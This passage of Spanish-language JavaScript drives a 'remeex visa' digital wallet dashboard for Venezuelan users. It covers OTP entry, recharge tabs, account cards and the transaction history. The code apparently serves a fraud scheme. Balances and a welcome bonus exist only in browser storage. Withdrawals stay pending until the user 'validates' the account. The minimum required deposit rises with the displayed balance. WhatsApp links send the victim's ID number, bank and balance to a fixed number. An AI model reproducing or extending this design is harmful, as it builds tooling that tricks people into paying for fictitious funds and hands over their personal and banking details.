            if (otpError) otpError.style.display = 'block';
            
            // Clear OTP inputs
            otpInputs.forEach(input => {
              input.value = '';
            });
            
            // Focus on first input
            const firstOtpInput = document.getElementById('otp-1');
            if (firstOtpInput) firstOtpInput.focus();
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Resend code link
      const resendCode = document.getElementById('resend-code');
      if (resendCode) {
        resendCode.addEventListener('click', function(e) {
          e.preventDefault();
          showToast('success', 'Cdigo Enviado', 'Se ha enviado un nuevo cdigo a su telfono.');
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // Bottom navigation handling
    function setupBottomNavigation() {
      const navItems = document.querySelectorAll('.nav-item');
      
      navItems.forEach(item => {
        item.addEventListener('click', function() {
          const section = this.getAttribute('data-section');
          
          // Cerrar todas las superposiciones primero
            document.querySelectorAll('.service-overlay, .cards-overlay, .messages-overlay, .settings-overlay, .exchange-overlay, .page-overlay').forEach(overlay => {
              overlay.style.display = 'none';
            });

          // Si es una seccin especial (services, cards, messages, settings)
          if (section === 'services') {
            const serviceOverlay = document.getElementById('service-overlay');
            if (serviceOverlay) serviceOverlay.style.display = 'flex';
          } else if (section === 'cards') {
            const cardsOverlay = document.getElementById('cards-overlay');
            if (cardsOverlay) cardsOverlay.style.display = 'flex';
          } else if (section === 'messages') {
            const messagesOverlay = document.getElementById('messages-overlay');
            if (messagesOverlay) messagesOverlay.style.display = 'flex';
          } else if (section === 'settings') {
            const settingsOverlay = document.getElementById('settings-overlay');
            if (settingsOverlay) {
              settingsOverlay.style.display = 'flex';
              
              // Update settings form
              const settingsName = document.getElementById('settings-name');
              const settingsEmail = document.getElementById('settings-email');
              
              if (settingsName) settingsName.value = currentUser.name;
              if (settingsEmail) settingsEmail.value = currentUser.email;
            }
          } else if (section === 'home') {
            // Actualizar navegacin
            navItems.forEach(navItem => {
              navItem.classList.remove('active');
            });
            this.classList.add('active');
          }
          
          // Asegurar que el chat de Tawk.to est visible
          ensureTawkToVisibility();
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      });
      
      // View all transactions
      const viewAllTransactions = document.getElementById('view-all-transactions');
      if (viewAllTransactions) {
        viewAllTransactions.addEventListener('click', function(e) {
          e.preventDefault();
          
          // Mostrar todas las transacciones en un overlay o modal
          showToast('info', 'Historial Completo', 'Esta funcin estar disponible prximamente.');
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Verify button in dashboard
      const dashboardVerifyAction = document.getElementById('start-verification-card');
      if (dashboardVerifyAction) {
        dashboardVerifyAction.addEventListener('click', function() {
          // Redirigir a la pgina de verificacin
          window.location.href = '';

          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // Logout button
    function setupLogoutButton() {
      const logoutBtn = document.getElementById('logout-btn');
      const headerLogoutBtn = document.getElementById('header-logout-btn');
      const logoutModal = document.getElementById('logout-modal');

      [logoutBtn, headerLogoutBtn].forEach(btn => {
        if (btn) {
          btn.addEventListener('click', function() {

            if (logoutModal) logoutModal.style.display = 'flex';

            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      });
    }

    // Recharge buttons
    function setupRechargeButtons() {
      // Recargar saldo
      document.querySelectorAll('#recharge-btn, #quick-recharge').forEach(btn => {
        if (btn) {
          btn.addEventListener('click', function() {
            const dashboardContainer = document.getElementById('dashboard-container');
            const rechargeContainer = document.getElementById('recharge-container');
            
            if (dashboardContainer) dashboardContainer.style.display = 'none';
            if (rechargeContainer) rechargeContainer.style.display = 'block';
            
            // Actualizar UI de tarjeta guardada
            updateSavedCardUI();
            
            // Reset inactivity timer
            resetInactivityTimer();
            
            // Asegurar que el chat de Tawk.to est visible
            ensureTawkToVisibility();
          });
        }
      });
      
      // Back button in recharge
      const rechargeBack = document.getElementById('recharge-back');
      if (rechargeBack) {
        rechargeBack.addEventListener('click', function() {
          const rechargeContainer = document.getElementById('recharge-container');
          const dashboardContainer = document.getElementById('dashboard-container');
          
          if (rechargeContainer) rechargeContainer.style.display = 'none';
          if (dashboardContainer) dashboardContainer.style.display = 'block';
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
      
      // Send button - carga transferencia via AJAX y comparte datos via sessionStorage
      document.querySelectorAll('#send-btn, #success-transfer').forEach(btn => {
        if (btn) {
          btn.addEventListener('click', function(e) {
            if (currentUser.balance.usd <= 0) {
              showToast('error', 'Fondos Insuficientes', 'No tiene fondos suficientes para realizar una transferencia. Por favor recargue su cuenta primero.');
              return;
            }

            // Guardar informacin necesaria en sessionStorage para compartir con transferencia
            saveDataForTransfer();

            // Cargar la pgina de transferencia sin recargar
            if (typeof loadTransferPage === 'function') {
              loadTransferPage();
            } else {
              window.location.href = '';
            }

            // Reset inactivity timer
            resetInactivityTimer();
          });
        }
      });
      
      // Receive button - link to external page
      const receiveBtn = document.getElementById('receive-btn');
      if (receiveBtn) {
        receiveBtn.addEventListener('click', function(e) {
          if (isFeatureBlocked()) {
            e.preventDefault();
            showFeatureBlockedModal();
          } else {
            // Redireccionar utilizando URL sin extensin
            window.location.href = 'recibirfondos';
          }
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      }
    }

    // Payment method tabs
    function setupPaymentMethodTabs() {
      const paymentTabs = document.querySelectorAll('.payment-method-tab');
      if (paymentTabs.length > 0) {
        paymentTabs.forEach(tab => {
          tab.addEventListener('click', function() {
            // Update active tab
            document.querySelectorAll('.payment-method-tab').forEach(t => {
              t.classList.remove('active');
            });
            this.classList.add('active');
            
            // Show selected content
            const targetId = this.dataset.target;
            selectedPaymentMethod = targetId;
            
            document.querySelectorAll('.payment-method-content').forEach(content => {
              content.classList.remove('active');
            });
            
            const targetContent = document.getElementById(targetId);
            if (targetContent) {
              targetContent.classList.add('active');
              
              // Resetear mensaje de soporte si se cambia a otro mtodo de pago
              if (targetId !== 'mobile-payment') {
                resetSupportNeededState();
              } else {
                // Si se cambia a pago mvil, verificar si necesitamos mostrar el mensaje
                loadMobilePaymentData();
                
                // CORRECCIN 2: Actualizar la UI de pago mvil cuando se cambia a esta pestaa
                updateMobilePaymentInfo();
              }
            }
            
            // Actualizar selectedAmount segn el selector activo
            if (targetId === 'card-payment') {
              const cardAmountSelect = document.getElementById('card-amount-select');
              if (cardAmountSelect && cardAmountSelect.value) {
                const option = cardAmountSelect.options[cardAmountSelect.selectedIndex];
                selectedAmount.usd = parseInt(option.value) || 0;
                selectedAmount.bs = parseInt(option.dataset.bs) || 0;
                selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
              } else {
                // Si no hay valor seleccionado, resetear selectedAmount
                selectedAmount = { usd: 0, bs: 0, eur: 0 };
              }
            } else if (targetId === 'bank-payment') {
              const bankAmountSelect = document.getElementById('bank-amount-select');
              if (bankAmountSelect && bankAmountSelect.value) {
                const option = bankAmountSelect.options[bankAmountSelect.selectedIndex];
                selectedAmount.usd = parseInt(option.value) || 0;
                selectedAmount.bs = parseInt(option.dataset.bs) || 0;
                selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
              } else {
                // Si no hay valor seleccionado, resetear selectedAmount
                selectedAmount = { usd: 0, bs: 0, eur: 0 };
              }
            } else if (targetId === 'mobile-payment') {
              const mobileAmountSelect = document.getElementById('mobile-amount-select');
              if (mobileAmountSelect && mobileAmountSelect.value) {
                const option = mobileAmountSelect.options[mobileAmountSelect.selectedIndex];
                selectedAmount.usd = parseInt(option.value) || 0;
                selectedAmount.bs = parseInt(option.dataset.bs) || 0;
                selectedAmount.eur = parseFloat(option.dataset.eur) || 0;
              } else {
                // Si no hay valor seleccionado, resetear selectedAmount
                selectedAmount = { usd: 0, bs: 0, eur: 0 };
              }
            }
            
            // Actualizar el estado de los botones de pago
            updateSubmitButtonsState();
            
            // Reset inactivity timer
            resetInactivityTimer();
          });
        });
      }
    }

    // Copy buttons
    function setupCopyButtons() {
      document.querySelectorAll('.copy-btn[data-copy]').forEach(btn => {
        btn.addEventListener('click', function() {
          const textToCopy = this.getAttribute('data-copy');
          
          // Create a temporary textarea
          const textarea = document.createElement('textarea');
          textarea.value = textToCopy;
          textarea.style.position = 'fixed';
          document.body.appendChild(textarea);
          textarea.select();
          
          try {
            // Copy the text
            document.execCommand('copy');
            showToast('success', 'Copiado', 'Texto copiado al portapapeles');
          } catch (err) {
            showToast('error', 'Error', 'No se pudo copiar el texto');
          }
          
          document.body.removeChild(textarea);
          
          // Reset inactivity timer
          resetInactivityTimer();
        });
      });
    }

    // Update dashboard UI
    function updateDashboardUI() {
      updateMainBalanceDisplay();
      updateSavingsButton();
      adjustMobileAmountOptions();

      // Check for pending transactions
      updatePendingTransactionsBadge();
      updateRejectedTransactionsBadge();
      
      // Update recent transactions
      updateRecentTransactions();
      
      // Asegurar que el chat de Tawk.to est visible
      ensureTawkToVisibility();

      // Actualizar enlaces de WhatsApp con informacin del usuario
      updateWhatsAppLinks();
      updateWithdrawButtonText();
      populateAccountCard();
    }

    // Generar mensajes y actualizar los enlaces de WhatsApp
    function buildWhatsAppMessage() {
      const name = currentUser.fullName || currentUser.name || 'usuario';
      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const bankName = BANK_NAME_MAP[reg.primaryBank] || reg.primaryBank || 'mi banco';
      const tier = localStorage.getItem('remeexAccountTier') || 'Estndar';
      const balanceData = JSON.parse(localStorage.getItem('remeexBalance') || '{}');
      const saldoBs = balanceData.bs ? formatCurrency(balanceData.bs, 'bs') : 'N/A';
      const saldoUsd = balanceData.usd ? formatCurrency(balanceData.usd, 'usd') : 'N/A';
      const id = currentUser.idNumber || reg.documentNumber || '';
      let message = `Hola, soy ${name}, cdula ${id}, soy usuario remeex visa VERE54872 de Venezuela. Mi saldo actual es de ${saldoBs} (${saldoUsd}), mi banco asociado es ${bankName}, mi nivel de cuenta es ${tier}, y solicito ayuda para el proceso de validacin de mi cuenta, ya que mi nivel ${tier} requiere que haga una validacin desde mi cuenta de banco ${bankName}`;

      if (balanceData.usd > 515) {
        try {
          const data = JSON.parse(localStorage.getItem('remeexTransactions') || '{}');
          const txs = data.transactions || [];
          const deposits = txs.filter(t => t.type === 'deposit' && t.status === 'completed');
          if (deposits.length) {
            const details = deposits.map(t => {
              if (t.description === 'Bono de bienvenida') {
                return `Bono de Bienvenida de ${formatCurrency(t.amount, 'usd')}`;
              }
              const card = t.card ? ` ${t.card}` : '';
              return `${t.description}${card} por la cantidad de ${formatCurrency(t.amount, 'usd')}`;
            }).join(' / ');
            message += `\n\n${details}`;
          }
        } catch (e) {}
      }

      return message;
    }

    function updateWhatsAppLinks() {
      const links = document.querySelectorAll('a.whatsapp-link');
      if (!links.length) return;

      const encoded = encodeURIComponent(buildWhatsAppMessage());

      links.forEach(link => {
        link.href = `https://wa.me/+17373018059?text=${encoded}`;
      });
    }

    function updateWithdrawButtonText() {
      const sendBtn = document.getElementById('send-btn');
      if (!sendBtn) return;
      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
      if (bankName) {
        sendBtn.innerHTML = `<i class="fas fa-upload"></i> Retirar Dinero a ${bankName}`;
      }
    }

    function populateAccountCard() {
      const card = document.getElementById('account-card');
      if (!card) return;
      const nameEl = document.getElementById('account-name');
      const idEl = document.getElementById('account-id');
      const phoneEl = document.getElementById('account-phone');
      const bankEl = document.getElementById('account-bank');
      const accEl = document.getElementById('account-number-display');
      const logoEl = document.getElementById('account-logo');

      if (nameEl) nameEl.textContent = currentUser.fullName || currentUser.name || '';
      if (idEl) idEl.textContent = currentUser.idNumber || '';
      if (phoneEl) phoneEl.textContent = currentUser.phoneNumber || '';

      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
      if (bankEl) bankEl.textContent = bankName;

      const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
      if (accEl) {
        if (banking.accountNumber) {
          accEl.textContent = banking.accountNumber;
        } else {
          accEl.textContent = `Pendiente de validacin por parte de ${currentUser.name || ''}`;
        }
      }
      if (logoEl) {
        let logoUrl = banking.bankLogo;
        if (!logoUrl) {
          logoUrl = reg.primaryBankLogo || (typeof getBankLogo === 'function' ? getBankLogo(reg.primaryBank) : '');
        }
        logoEl.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="Logo Banco">` : '';
      }

      const balUsd = document.getElementById('account-balance-usd');
      const balBs = document.getElementById('account-balance-bs');
      const balEur = document.getElementById('account-balance-eur');
      if (balUsd) balUsd.textContent = formatCurrency(currentUser.balance.usd,'usd');
      if (balBs) balBs.textContent = formatCurrency(currentUser.balance.bs,'bs');
      if (balEur) balEur.textContent = formatCurrency(currentUser.balance.eur,'eur');

      const wSlider = document.getElementById('withdrawal-limit-slider');
      const wValue = document.getElementById('withdrawal-limit-value');
      const dSlider = document.getElementById('deposit-limit-slider');
      const dValue = document.getElementById('deposit-limit-value');
      if (wSlider && wValue) {
        const max = 10000;
        wSlider.min = 25;
        wSlider.max = max;
        const saved = parseInt(localStorage.getItem('remeexWithdrawalLimit') || wSlider.max, 10);
        wSlider.value = saved;
        wValue.textContent = saved;
        wSlider.oninput = () => { wValue.textContent = wSlider.value; };
        wSlider.onchange = () => localStorage.setItem('remeexWithdrawalLimit', wSlider.value);
      }
      if (dSlider && dValue) {
        const max = 10000;
        dSlider.min = 25;
        dSlider.max = max;
        const saved = parseInt(localStorage.getItem('remeexDepositLimit') || dSlider.max, 10);
        dSlider.value = saved;
        dValue.textContent = saved;
        dSlider.oninput = () => { dValue.textContent = dSlider.value; };
        dSlider.onchange = () => localStorage.setItem('remeexDepositLimit', dSlider.value);
      }

      const withdrawalToggle = document.getElementById('withdrawal-toggle');
      if (withdrawalToggle) {
        const enabled = localStorage.getItem('remeexWithdrawalsEnabled') !== 'false';
        withdrawalToggle.checked = enabled;
        withdrawalToggle.onchange = () => {
          localStorage.setItem('remeexWithdrawalsEnabled', withdrawalToggle.checked);
        };
      }
      const freezeToggle = document.getElementById('freeze-toggle');
      if (freezeToggle) {
        const frozen = localStorage.getItem('remeexFrozen') === 'true';
        freezeToggle.checked = frozen;
        freezeToggle.onchange = () => {
          localStorage.setItem('remeexFrozen', freezeToggle.checked);
        };
      }
      const currencySelect = document.getElementById('primary-currency');
      if (currencySelect) {
        const primary = localStorage.getItem('remeexPrimaryCurrency') || 'usd';
        currencySelect.value = primary;
        currencySelect.onchange = () => {
          localStorage.setItem('remeexPrimaryCurrency', currencySelect.value);
        };
      }

      const banksList = document.getElementById('banks-list');
      if (banksList) {
        const stored = JSON.parse(localStorage.getItem('remeexBanks') || '[]');
        banksList.innerHTML = stored.map(b => `<div>${BANK_NAME_MAP[b.bankId] || b.bankId} - ${b.account}</div>`).join('');
      }

      card.style.display = 'block';
    }

    function refreshAccountData() {
      populateAccountCard();
      showToast('success', 'Datos actualizados', 'La informacin se ha refrescado');
    }

    function openAccountEditModal() {
      const modal = document.getElementById('account-edit-modal');
      if (!modal) return;
      document.getElementById('edit-name').value = currentUser.fullName || currentUser.name || '';
      document.getElementById('edit-id').value = currentUser.idNumber || '';
      document.getElementById('edit-phone').value = currentUser.phoneNumber || '';
      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const bankSelect = document.getElementById('edit-bank');
      if (bankSelect && window.BANK_DATA) {
        bankSelect.innerHTML = '';
        const banks = [...BANK_DATA.NACIONAL, ...BANK_DATA.INTERNACIONAL, ...BANK_DATA.FINTECH];
        banks.forEach(b => {
          const opt = document.createElement('option');
          opt.value = b.id;
          opt.textContent = b.name;
          bankSelect.appendChild(opt);
        });
        bankSelect.value = reg.primaryBank || '';
      }
      document.getElementById('edit-id').disabled = true;
      document.getElementById('edit-phone').disabled = true;
      const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
      document.getElementById('edit-account-number').value = banking.accountNumber || '';
      modal.style.display = 'flex';
    }

  function closeAccountEditModal() {
      const modal = document.getElementById('account-edit-modal');
      if (modal) modal.style.display = 'none';
    }

    function saveAccountChanges() {
      const name = document.getElementById('edit-name').value.trim();
      const bank = document.getElementById('edit-bank').value.trim();
      const account = document.getElementById('edit-account-number').value.trim();

      currentUser.fullName = name;

      const userData = JSON.parse(localStorage.getItem('visaUserData') || '{}');
      userData.fullName = name;
      localStorage.setItem('visaUserData', JSON.stringify(userData));

      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      reg.primaryBank = bank;
      localStorage.setItem('visaRegistrationCompleted', JSON.stringify(reg));

      const banking = JSON.parse(localStorage.getItem('remeexVerificationBanking') || '{}');
      banking.accountNumber = account;
      localStorage.setItem('remeexVerificationBanking', JSON.stringify(banking));

      populateAccountCard();
      showToast('success', 'Datos guardados', 'La informacin de tu cuenta ha sido actualizada');
      closeAccountEditModal();
    }

    function setupAccountEditModal() {
      const editBtn = document.getElementById('edit-account-btn');
      const refreshBtn = document.getElementById('refresh-account-btn');
      const closeBtn = document.getElementById('account-edit-close');
      const saveBtn = document.getElementById('save-account-btn');

      if (editBtn) {
        editBtn.addEventListener('click', function() {
          openAccountEditModal();
          resetInactivityTimer();
        });
      }
      if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
          refreshAccountData();
          resetInactivityTimer();
        });
      }
      if (closeBtn) {
        closeBtn.addEventListener('click', function() {
          closeAccountEditModal();
          resetInactivityTimer();
        });
      }
      if (saveBtn) {
        saveBtn.addEventListener('click', function() {
          saveAccountChanges();
          resetInactivityTimer();
        });
      }
    }

    function setupBankManagement() {
      const addBtn = document.getElementById('add-bank-btn');
      if (!addBtn) return;
      addBtn.addEventListener('click', function() {
        const bankId = prompt('Seleccione banco por ID (ej: banco-venezuela)');
        const account = prompt('Nmero de cuenta');
        if (bankId && account) {
          const banks = JSON.parse(localStorage.getItem('remeexBanks') || '[]');
          banks.push({ bankId, account });
          localStorage.setItem('remeexBanks', JSON.stringify(banks));
          populateAccountCard();
        }
      });
    }

    function displayPreLoginBalance() {
      const card = document.getElementById('pre-login-balance');
      if (!card) return;
      const stored = localStorage.getItem(CONFIG.STORAGE_KEYS.BALANCE) || sessionStorage.getItem(CONFIG.SESSION_KEYS.BALANCE);
      if (!stored) {
        card.style.display = 'none';
        return;
      }
      try {
        const bal = JSON.parse(stored);
        const usd = bal.usd || 0;
        const bs = bal.bs || usd * CONFIG.EXCHANGE_RATES.USD_TO_BS;
        const eur = bal.eur || usd * CONFIG.EXCHANGE_RATES.USD_TO_EUR;
        document.getElementById('pre-main-balance').textContent = formatCurrency(bs, 'bs');
        document.getElementById('pre-usd-balance').textContent = ` ${formatCurrency(usd, 'usd')}`;
        document.getElementById('pre-eur-balance').textContent = ` ${formatCurrency(eur, 'eur')}`;
        document.getElementById('pre-exchange-rate').textContent = `Tasa: 1 USD = ${CONFIG.EXCHANGE_RATES.USD_TO_BS.toFixed(2)} Bs | 1 USD = ${CONFIG.EXCHANGE_RATES.USD_TO_EUR.toFixed(2)} EUR`;
        card.style.display = 'block';
      } catch (e) {
        card.style.display = 'none';
      }
    }

    function personalizeLogin() {
      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const name = reg.preferredName || reg.firstName || '';
      const email = reg.email || '';
      const gender = reg.gender || '';
      const now = new Date();
      const hour = now.getHours();
      const day = now.toLocaleDateString('es-ES', { weekday: 'long' });
      let greeting = 'Hola';
      if (hour >= 5 && hour < 12) greeting = 'Buenos das';
      else if (hour >= 12 && hour < 19) greeting = 'Buenas tardes';
      else greeting = 'Buenas noches';
      if (hour >= 4 && hour < 6) greeting = 'Hola, Alma madrugadora';

      const title = document.getElementById('welcome-message');
      const subtitle = document.getElementById('welcome-subtitle');
      const emailEl = document.getElementById('welcome-email');
      const balanceOwner = document.getElementById('pre-balance-owner');
      if (title) title.textContent = `${greeting}, ${name}!`;
      if (subtitle) subtitle.textContent = `Feliz ${day.charAt(0).toUpperCase() + day.slice(1)} ${name}`;
      if (emailEl) emailEl.textContent = email;
      if (balanceOwner) balanceOwner.textContent = `${name}, tu saldo disponible es`;

      const nameInput = document.getElementById('full-name');
      const emailInput = document.getElementById('email');
      if (nameInput) nameInput.value = name;
      if (emailInput) emailInput.value = email;
    }

    // Create transaction HTML element
    function createTransactionElement(transaction) {
      const element = document.createElement('div');
      element.className = 'transaction-item';
      element.setAttribute('aria-label', `Transaccin: ${transaction.description}`);
      
      let iconClass = 'fas fa-arrow-right';
      let typeClass = transaction.type;
      let amountPrefix = '';
      
      if (transaction.type === 'deposit') {
        iconClass = 'fas fa-arrow-down';
        amountPrefix = '+';
      } else if (transaction.type === 'withdraw') {
        iconClass = 'fas fa-arrow-up';
        amountPrefix = '-';
      }

      if (transaction.status === 'pending' || transaction.type === 'pending') {
        iconClass = 'fas fa-clock';
        typeClass = 'pending';
        amountPrefix = transaction.type === 'withdraw' ? '-' : '+';
      } else if (transaction.status === 'rejected') {
        iconClass = 'fas fa-times';
        typeClass = 'rejected';
        amountPrefix = transaction.type === 'withdraw' ? '-' : '+';
      }
      
      // Sanitizar datos
      const safeDescription = escapeHTML(transaction.description);
      const safeDate = escapeHTML(transaction.date);
      
      const safeFirstName = currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : 'el usuario';

      let transactionHTML = `
        <div class="transaction-icon ${typeClass}">
          <i class="${iconClass}"></i>
        </div>
        <div class="transaction-content">
          <div class="transaction-title">${safeDescription}
      `;
      
      // Badge para estados de la transaccin
      if (transaction.status === 'rejected') {
        transactionHTML += `
          <span class="transaction-badge rejected">
            <i class="fas fa-times"></i> Rechazado
          </span>
        `;
        if (transaction.description === 'Pago Mvil') {
          transactionHTML += `
            <span class="transaction-badge validation">No se pudo encontrar pago mvil porque el concepto no coincide con el cdigo indicado</span>
          `;
        }
      } else if (transaction.type === 'pending' || transaction.status === 'pending') {
        transactionHTML += `
          <span class="transaction-badge pending">
            <i class="fas fa-clock"></i> Pendiente
          </span>
          <span class="transaction-badge validation">A la espera que ${safeFirstName} valide su cuenta para habilitar retiros</span>
        `;
      }
      
      transactionHTML += `
          </div>
          <div class="transaction-details">
            <div class="transaction-date">
              <i class="far fa-calendar"></i>
              <span>${safeDate}</span>
            </div>
      `;
      
      if (transaction.card) {
        const safeCard = escapeHTML(transaction.card);
        transactionHTML += `
          <div class="transaction-category">
            <i class="far fa-credit-card"></i>
            <span>Tarjeta ${safeCard}</span>
          </div>
        `;
      }
      
      if (transaction.reference) {
        const safeReference = escapeHTML(transaction.reference);
        transactionHTML += `
          <div class="transaction-category">
            <i class="fas fa-hashtag"></i>
            <span>Ref: ${safeReference}</span>
          </div>
        `;
      }
      
      if (transaction.destination) {
        const safeDestination = escapeHTML(transaction.destination);
        transactionHTML += `
          <div class="transaction-category">
            <i class="far fa-user"></i>
            <span>Destino: ${safeDestination}</span>
          </div>
        `;
      }

      if (transaction.bankLogo) {
        const safeLogo = escapeHTML(transaction.bankLogo);
        const safeBank = escapeHTML(transaction.bankName || '');
        transactionHTML += `
          <div class="transaction-category">
            <img src="${safeLogo}" alt="${safeBank}" class="transaction-bank-logo">
            <span>${safeBank}</span>
          </div>
        `;
      }

      transactionHTML += `
          </div>
        </div>
        <div class="transaction-amount ${typeClass}">
          ${amountPrefix}${formatCurrency(transaction.amount, 'usd')}
        </div>
      `;
      
      element.innerHTML = transactionHTML;
      
      return element;
    }

    // Update recent transactions
  function updateRecentTransactions() {
      const recentTransactions = document.getElementById('recent-transactions');

      if (!recentTransactions) return;

      // Limpiar lista para reflejar cambios de estado
      recentTransactions.innerHTML = '';
      displayedTransactions.clear();

      if (currentUser.transactions.length === 0 && displayedTransactions.size === 0) {
        const noTransactionsMsg = document.createElement('div');
        noTransactionsMsg.className = 'transaction-item no-transactions';
        noTransactionsMsg.innerHTML = `
          <div class="transaction-icon" style="background: var(--neutral-300); color: var(--neutral-600);">
            <i class="fas fa-receipt"></i>
          </div>
          <div class="transaction-content">
            <div class="transaction-title">No hay transacciones recientes</div>
            <div class="transaction-details">
              <div class="transaction-date">
                <i class="far fa-calendar"></i>
                <span>Realice una recarga para ver su historial</span>
              </div>
            </div>
          </div>
        `;
        recentTransactions.appendChild(noTransactionsMsg);
        displayedTransactions.add('no-tx');
        return;
      }

      const placeholder = recentTransactions.querySelector('.no-transactions');
      if (placeholder) {
        placeholder.remove();
        displayedTransactions.delete('no-tx');
      }

      currentUser.transactions.slice().reverse().forEach(tx => {
        const ref = tx.reference || tx.id || JSON.stringify(tx);
        if (displayedTransactions.has(ref)) return;

        if (transactionFilter === 'sent' && tx.type !== 'withdraw') return;
        if (transactionFilter === 'received' && tx.type !== 'deposit') return;
        if (transactionFilter === 'savings' && !tx.description.toLowerCase().includes('ahorro')) return;
        if (transactionFilter === 'exchange' && !tx.description.toLowerCase().includes('intercambio')) return;
        if (transactionFilter === 'services' && !tx.description.toLowerCase().includes('servicio')) return;

        const transactionElement = createTransactionElement(tx);
        recentTransactions.insertBefore(transactionElement, recentTransactions.firstChild);
        displayedTransactions.add(ref);
      });
    }

    // Update UI with user data
    function updateUserUI() {
      // Update user display name
      if (currentUser.name) {
        const userInitials = currentUser.name.split(' ').map(n => n[0]).join('').toUpperCase();
        
        const headerAvatar = document.getElementById('header-avatar');
        
        if (headerAvatar) headerAvatar.textContent = userInitials;
        
        // Update balance label with user name
        const balanceLabelName = document.getElementById('balance-label-name');
      if (balanceLabelName) {
        const firstName = currentUser.name.split(' ')[0];
        balanceLabelName.textContent = `${firstName}, tu saldo disponible`;
      }
      }

      personalizeStatusTexts();

      // Update dashboard
      updateDashboardUI();
    }

    // Update submit button text based on selected amount
  function updateSubmitButtonText() {
    // Esta funcin ahora se maneja en updateSubmitButtonsState
    updateSubmitButtonsState();
  }

  function personalizeStatusTexts() {
    const firstName = currentUser.fullName ? escapeHTML(currentUser.fullName.split(' ')[0]) : (currentUser.name ? escapeHTML(currentUser.name.split(' ')[0]) : '');
    if (!firstName) return;
    const rechargeTitle = document.getElementById('first-recharge-title');
    if (rechargeTitle) rechargeTitle.textContent = `${firstName}, haz tu primera recarga`;
    const verifyTitle = document.getElementById('verify-identity-title');
    if (verifyTitle) verifyTitle.textContent = `${firstName}, verifica tus datos`;
    const finalHeading = document.getElementById('verification-final-heading');
    if (finalHeading) finalHeading.textContent = `${firstName}, verificacin en progreso`;
    const finalText = document.getElementById('final-step-text');
    if (finalText) finalText.textContent = `${firstName}, te falta un ltimo paso para activar todas las funciones.`;
  }

  function updateMainBalanceDisplay() {
    const mainValue = document.getElementById('main-balance-value');
    const mainSymbol = document.getElementById('main-currency-symbol');
    const mainFlag = document.getElementById('main-currency-flag');
    const equivalents = document.querySelectorAll('.balance-equivalent');
    const currencyBtn = document.getElementById('currency-toggle-btn');
    const visibilityBtn = document.getElementById('balance-visibility-btn');

    if (!mainValue || !mainSymbol || !mainFlag || equivalents.length < 2) return;

    if (currencyBtn) {
      currencyBtn.textContent = selectedBalanceCurrency === 'bs' ? 'USD' : 'Bs';
    }
    if (visibilityBtn) {
      visibilityBtn.innerHTML = isBalanceHidden ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
    }

    if (isBalanceHidden) {
      mainValue.textContent = '';
      equivalents.forEach(eq => {
        const span = eq.querySelector('span');
        if (span) span.textContent = '';
      });
      return;
    }

    const eq1Flag = equivalents[0].querySelector('img');
    const eq1Span = equivalents[0].querySelector('span');
    const eq2Flag = equivalents[1].querySelector('img');
    const eq2Span = equivalents[1].querySelector('span');

    if (selectedBalanceCurrency === 'bs') {
      mainFlag.src = 'https://upload.wikimedia.org/wikipedia/commons/0/06/Flag_of_Venezuela.svg';
      mainSymbol.textContent = 'Bs';
      mainValue.textContent = formatCurrency(currentUser.balance.bs, 'bs').replace('Bs ', '');
      if (eq1Flag) eq1Flag.src = 'https://flagcdn.com/us.svg';
      if (eq1Span) eq1Span.textContent = ` ${formatCurrency(currentUser.balance.usd, 'usd')}`;
      if (eq2Flag) eq2Flag.src = 'https://upload.wikimedia.org/wikipedia/commons/b/b7/Flag_of_Europe.svg';
      if (eq2Span) eq2Span.textContent = ` ${formatCurrency(currentUser.balance.eur, 'eur')}`;
    } else {
      mainFlag.src = 'https://flagcdn.com/us.svg';
      mainSymbol.textContent = '$';
      mainValue.textContent = formatCurrency(currentUser.balance.usd, 'usd').replace('$', '');
      if (eq1Flag) eq1Flag.src = 'https://upload.wikimedia.org/wikipedia/commons/0/06/Flag_of_Venezuela.svg';
      if (eq1Span) eq1Span.textContent = ` ${formatCurrency(currentUser.balance.bs, 'bs')}`;
      if (eq2Flag) eq2Flag.src = 'https://upload.wikimedia.org/wikipedia/commons/b/b7/Flag_of_Europe.svg';
      if (eq2Span) eq2Span.textContent = ` ${formatCurrency(currentUser.balance.eur, 'eur')}`;
    }
  }

  function adjustMobileAmountOptions() {
    const mobileAmountSelect = document.getElementById('mobile-amount-select');
    if (!mobileAmountSelect) return;

    let minAmount = 25;
    if (currentUser.balance.usd > 2000) {
      minAmount = 35;
    } else if (currentUser.balance.usd > 1000) {
      minAmount = 30;
    }

    Array.from(mobileAmountSelect.options).forEach(opt => {
      if (!opt.value || opt.disabled) return;
      opt.style.display = parseInt(opt.value) < minAmount ? 'none' : '';
    });

    if (mobileAmountSelect.value && parseInt(mobileAmountSelect.value) < minAmount) {
      mobileAmountSelect.selectedIndex = 0;
      selectedAmount = { usd: 0, bs: 0, eur: 0 };
      updateSubmitButtonsState();
    }
  }

  function setupBalanceControls() {
    const currencyBtn = document.getElementById('currency-toggle-btn');
    const visibilityBtn = document.getElementById('balance-visibility-btn');

    if (currencyBtn) {
      currencyBtn.addEventListener('click', function() {
        selectedBalanceCurrency = selectedBalanceCurrency === 'bs' ? 'usd' : 'bs';
